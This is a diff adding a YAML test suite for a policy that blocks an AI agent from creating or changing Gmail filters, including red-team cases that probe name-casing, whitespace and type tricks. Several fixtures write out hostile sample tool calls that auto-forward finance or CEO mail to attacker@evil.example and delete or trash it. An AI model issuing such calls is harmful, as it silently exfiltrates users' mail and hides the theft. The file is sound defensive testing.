@@ -1,0 +1,491 @@
+# Reason strings asserted below (kept in sync with policy.md):
+#   create-reason  -> fires for create_filter / create_filter_from_template
+#   manage-reason  -> fires for manage_gmail_filter with a non-read action
+- description: Unrelated Gmail read (search_emails) is not a filter surface. Policy
+    should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-search_emails
+      uri: null
+    payload:
+      name: gmail-mcp-search_emails
+      args:
+        query: "from:boss@example.com"
+        maxResults: 10
+  output:
+    expectedResult: allow
+- description: Dedicated filter read list_filters (GongRzhe) passes untouched. Policy
+    should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-list_filters
+      uri: null
+    payload:
+      name: gmail-mcp-list_filters
+      args: {}
+  output:
+    expectedResult: allow
+- description: Dedicated filter read get_filter (GongRzhe) passes untouched. Policy
+    should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-get_filter
+      uri: null
+    payload:
+      name: gmail-mcp-get_filter
+      args:
+        filterId: ANe1Bmj4example
+  output:
+    expectedResult: allow
+- description: Dedicated filter read list_gmail_filters (taylorwilsdon) passes untouched.
+    Policy should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-list_gmail_filters
+      uri: null
+    payload:
+      name: workspace-mcp-list_gmail_filters
+      args:
+        user_google_email: user@example.com
+  output:
+    expectedResult: allow
+- description: create_filter with an auto-forward + delete action (GongRzhe) is the
+    BEC persistence primitive. Policy should deny with the creation reason.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-create_filter
+      uri: null
+    payload:
+      name: gmail-mcp-create_filter
+      args:
+        criteria:
+          from: finance@example.com
+        action:
+          forward: attacker@evil.example
+          delete: true
+  output:
+    expectedResult: deny
+    expectedReason: "Creating Gmail filters through the agent is blocked: a filter can silently auto-forward or auto-delete mail and persists after this session ends. Manage filters in the Gmail settings UI instead. If a filter is legitimately needed, ask your InfoSec team to review this request."
+- description: create_filter_from_template (GongRzhe) is equally a filter creation.
+    Policy should deny with the creation reason.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-create_filter_from_template
+      uri: null
+    payload:
+      name: gmail-mcp-create_filter_from_template
+      args:
+        template: forward-from-sender
+        from: ceo@example.com
+        forwardTo: attacker@evil.example
+  output:
+    expectedResult: deny
+    expectedReason: "Creating Gmail filters through the agent is blocked: a filter can silently auto-forward or auto-delete mail and persists after this session ends. Manage filters in the Gmail settings UI instead. If a filter is legitimately needed, ask your InfoSec team to review this request."
+- description: Hyphenated tool-name variant (server or gateway normalized underscores)
+    still matches the create suffix. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-create-filter
+      uri: null
+    payload:
+      name: gmail-mcp-create-filter
+      args:
+        criteria:
+          from: hr@example.com
+        action:
+          addLabelIds:
+            - TRASH
+  output:
+    expectedResult: deny
+    expectedReason: "Creating Gmail filters through the agent is blocked: a filter can silently auto-forward or auto-delete mail and persists after this session ends. Manage filters in the Gmail settings UI instead. If a filter is legitimately needed, ask your InfoSec team to review this request."
+- description: Mixed-case tool name (Create_Filter) cannot bypass the match — names
+    are lowercased first. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: Gmail-MCP-Create_Filter
+      uri: null
+    payload:
+      name: Gmail-MCP-Create_Filter
+      args:
+        criteria:
+          subject: invoice
+        action:
+          forward: attacker@evil.example
+  output:
+    expectedResult: deny
+    expectedReason: "Creating Gmail filters through the agent is blocked: a filter can silently auto-forward or auto-delete mail and persists after this session ends. Manage filters in the Gmail settings UI instead. If a filter is legitimately needed, ask your InfoSec team to review this request."
+- description: manage_gmail_filter with action "list" (taylorwilsdon) is a read.
+    Policy should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage_gmail_filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage_gmail_filter
+      args:
+        user_google_email: user@example.com
+        action: list
+  output:
+    expectedResult: allow
+- description: manage_gmail_filter with action "get" is a read. Policy should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage_gmail_filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage_gmail_filter
+      args:
+        user_google_email: user@example.com
+        action: get
+        filter_id: ANe1Bmj4example
+  output:
+    expectedResult: allow
+- description: manage_gmail_filter with uppercase action "LIST" — action matching is
+    case-insensitive, so this stays a read. Policy should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage_gmail_filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage_gmail_filter
+      args:
+        user_google_email: user@example.com
+        action: LIST
+  output:
+    expectedResult: allow
+- description: manage_gmail_filter with action "create" is a filter mutation. Policy
+    should deny with the manage reason.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage_gmail_filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage_gmail_filter
+      args:
+        user_google_email: user@example.com
+        action: create
+        criteria:
+          from: payroll@example.com
+        add_label_ids:
+          - TRASH
+  output:
+    expectedResult: deny
+    expectedReason: "This Gmail filter management call is blocked: only the read-only actions 'list' and 'get' are allowed, because filter changes can silently auto-forward or auto-delete mail and persist after this session ends. Manage filters in the Gmail settings UI instead. If a filter change is legitimately needed, ask your InfoSec team to review this request."
+- description: manage_gmail_filter with action "delete" is also denied here (deliberate
+    overlap with the freeze-destructive-ops companion). Policy should deny with the
+    manage reason.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage_gmail_filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage_gmail_filter
+      args:
+        user_google_email: user@example.com
+        action: delete
+        filter_id: ANe1Bmj4example
+  output:
+    expectedResult: deny
+    expectedReason: "This Gmail filter management call is blocked: only the read-only actions 'list' and 'get' are allowed, because filter changes can silently auto-forward or auto-delete mail and persist after this session ends. Manage filters in the Gmail settings UI instead. If a filter change is legitimately needed, ask your InfoSec team to review this request."
+- description: manage_gmail_filter with the action argument missing entirely is an
+    unclassifiable filter mutation. Policy should fail closed and deny with the
+    manage reason.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage_gmail_filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage_gmail_filter
+      args:
+        user_google_email: user@example.com
+  output:
+    expectedResult: deny
+    expectedReason: "This Gmail filter management call is blocked: only the read-only actions 'list' and 'get' are allowed, because filter changes can silently auto-forward or auto-delete mail and persist after this session ends. Manage filters in the Gmail settings UI instead. If a filter change is legitimately needed, ask your InfoSec team to review this request."
+- description: manage_gmail_filter with a non-string action (number) cannot be
+    classified as a read. Policy should fail closed and deny with the manage reason.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage_gmail_filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage_gmail_filter
+      args:
+        user_google_email: user@example.com
+        action: 42
+  output:
+    expectedResult: deny
+    expectedReason: "This Gmail filter management call is blocked: only the read-only actions 'list' and 'get' are allowed, because filter changes can silently auto-forward or auto-delete mail and persist after this session ends. Manage filters in the Gmail settings UI instead. If a filter change is legitimately needed, ask your InfoSec team to review this request."
+- description: manage_gmail_filter with no args object at all still fails closed.
+    Policy should deny with the manage reason.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage_gmail_filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage_gmail_filter
+  output:
+    expectedResult: deny
+    expectedReason: "This Gmail filter management call is blocked: only the read-only actions 'list' and 'get' are allowed, because filter changes can silently auto-forward or auto-delete mail and persist after this session ends. Manage filters in the Gmail settings UI instead. If a filter change is legitimately needed, ask your InfoSec team to review this request."
+# ---------------------------------------------------------------------------
+# Red-team review additions (standards §10). No exploitable bypass was found;
+# these close untested Rego branches and pin claims the description makes.
+# ---------------------------------------------------------------------------
+- description: "Red-team: hyphenated manage tool variant (manage-gmail-filter) with a
+    create action must still be denied — the hyphen suffix branch was untested."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage-gmail-filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage-gmail-filter
+      args:
+        user_google_email: user@example.com
+        action: create
+        criteria:
+          from: ceo@example.com
+        add_label_ids:
+          - TRASH
+  output:
+    expectedResult: deny
+    expectedReason: "This Gmail filter management call is blocked: only the read-only actions 'list' and 'get' are allowed, because filter changes can silently auto-forward or auto-delete mail and persist after this session ends. Manage filters in the Gmail settings UI instead. If a filter change is legitimately needed, ask your InfoSec team to review this request."
+- description: "Red-team: hyphenated manage tool variant (manage-gmail-filter) with a
+    list action is still a read and must be allowed — proves the hyphen suffix does not
+    over-block reads."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage-gmail-filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage-gmail-filter
+      args:
+        user_google_email: user@example.com
+        action: list
+  output:
+    expectedResult: allow
+- description: "Red-team: hyphenated create-filter-from-template variant must be denied —
+    the hyphenated template suffix branch was untested."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-create-filter-from-template
+      uri: null
+    payload:
+      name: gmail-mcp-create-filter-from-template
+      args:
+        template: forward-from-sender
+        forwardTo: attacker@evil.example
+  output:
+    expectedResult: deny
+    expectedReason: "Creating Gmail filters through the agent is blocked: a filter can silently auto-forward or auto-delete mail and persists after this session ends. Manage filters in the Gmail settings UI instead. If a filter is legitimately needed, ask your InfoSec team to review this request."
+- description: "Red-team: manage tool with an unrecognized action (update) must be denied,
+    confirming the description's claim that anything other than list/get is a mutation."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage_gmail_filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage_gmail_filter
+      args:
+        user_google_email: user@example.com
+        action: update
+        filter_id: ANe1Bmj4example
+  output:
+    expectedResult: deny
+    expectedReason: "This Gmail filter management call is blocked: only the read-only actions 'list' and 'get' are allowed, because filter changes can silently auto-forward or auto-delete mail and persist after this session ends. Manage filters in the Gmail settings UI instead. If a filter change is legitimately needed, ask your InfoSec team to review this request."
+# ---------------------------------------------------------------------------
+# Second red-team pass (reviewer, standards §10). No exploitable bypass found;
+# these pin suffix precision (no over-block), fail-closed on encoding tricks,
+# and the documented scope boundaries the description claims.
+# ---------------------------------------------------------------------------
+- description: "Red-team encoding trick: action padded with surrounding whitespace
+    (' list ') is not the literal read value, so it must fail closed and deny — proves
+    whitespace cannot smuggle a mutation past the read check (nor sneak a read through)."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage_gmail_filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage_gmail_filter
+      args:
+        user_google_email: user@example.com
+        action: " list "
+  output:
+    expectedResult: deny
+    expectedReason: "This Gmail filter management call is blocked: only the read-only actions 'list' and 'get' are allowed, because filter changes can silently auto-forward or auto-delete mail and persist after this session ends. Manage filters in the Gmail settings UI instead. If a filter change is legitimately needed, ask your InfoSec team to review this request."
+- description: "Red-team: mixed-case NON-read action ('CREATE') must be denied — confirms
+    case-insensitivity only ever recognizes known reads (list/get) and never opens a
+    mutation path."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage_gmail_filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage_gmail_filter
+      args:
+        user_google_email: user@example.com
+        action: CREATE
+        criteria:
+          from: ceo@example.com
+  output:
+    expectedResult: deny
+    expectedReason: "This Gmail filter management call is blocked: only the read-only actions 'list' and 'get' are allowed, because filter changes can silently auto-forward or auto-delete mail and persist after this session ends. Manage filters in the Gmail settings UI instead. If a filter change is legitimately needed, ask your InfoSec team to review this request."
+- description: "Red-team: action non-string (array) cannot be classified as a read, must
+    fail closed and deny — exercises the is_string guard branch."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: workspace-mcp-manage_gmail_filter
+      uri: null
+    payload:
+      name: workspace-mcp-manage_gmail_filter
+      args:
+        user_google_email: user@example.com
+        action:
+          - list
+  output:
+    expectedResult: deny
+    expectedReason: "This Gmail filter management call is blocked: only the read-only actions 'list' and 'get' are allowed, because filter changes can silently auto-forward or auto-delete mail and persist after this session ends. Manage filters in the Gmail settings UI instead. If a filter change is legitimately needed, ask your InfoSec team to review this request."
+- description: "Red-team suffix precision: create_label is a create_* verb but NOT a filter
+    tool — it must pass through untouched (allow). Proves endswith('create_filter') does
+    not over-block sibling create verbs (single-purpose boundary)."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-create_label
+      uri: null
+    payload:
+      name: gmail-mcp-create_label
+      args:
+        name: Invoices
+  output:
+    expectedResult: allow
+- description: "Red-team scope boundary: an unrelated write tool (send_email) must NOT be
+    blocked by this single-purpose filter policy — allow. External send is a different
+    family's job."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-send_email
+      uri: null
+    payload:
+      name: gmail-mcp-send_email
+      args:
+        to:
+          - recipient@example.com
+        subject: hello
+        body: hi
+  output:
+    expectedResult: allow
+- description: "Red-team documented boundary: delete_filter passes through THIS policy
+    (allow) — its denial is delegated to the freeze-destructive-ops companion. Pins the
+    Composition/Known-limitations claim so the delegation stays intentional, not accidental."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-delete_filter
+      uri: null
+    payload:
+      name: gmail-mcp-delete_filter
+      args:
+        filterId: ANe1Bmj4example
+  output:
+    expectedResult: allow
